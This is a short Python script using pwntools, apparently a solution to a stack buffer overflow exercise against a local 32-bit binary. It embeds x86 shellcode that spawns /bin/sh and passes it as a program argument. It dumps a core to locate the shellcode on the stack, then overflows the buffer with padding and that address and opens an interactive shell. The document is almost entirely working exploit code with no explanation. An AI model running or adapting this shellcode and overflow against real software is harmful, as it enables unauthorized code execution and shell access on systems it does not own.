#! /usr/bin/env python
from pwn import *
#env = {
#   'shell' : 'j2X\xcd\x80PP[YjGX\xcd\x801\xc91\xd2Qhn/shh//bi\x89\xe3j\x0bX\xcd\x80'
#}
#env = {
args = ['./stack-ovfl-no-envp-32', 'j2X\xcd\x80PP[YjGX\xcd\x801\xc91\xd2Qhn/shh//bi\x89\xe3j\x0bX\xcd\x80']
p = process(argv=args)

if not os.path.exists('./core'):
    p.writeline('A' * 0x20)
    p.wait()

c = Core('./core')

addr_env = c.stack.find(args[1])

p = process(argv=args)
buf = 'A' * 0x10 + p32(addr_env)

with open('in.txt', 'w') as f:
    f.write('%s\n' % buf)
    f.close()

p.writeline(buf)

p.interactive()
